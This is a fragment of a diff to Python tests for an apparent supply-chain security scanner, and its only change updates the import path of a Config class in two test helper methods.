     @staticmethod
     def _rules(tmp_path, source: str) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "setup.py").write_text(source, encoding="utf-8")
         return {
@@ -14729,7 +14715,7 @@ class TestAMaliciousPinInATestFixture:
     @staticmethod
     def _severity(tmp_path, directory: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         target = tmp_path / directory
         target.mkdir(parents=True)
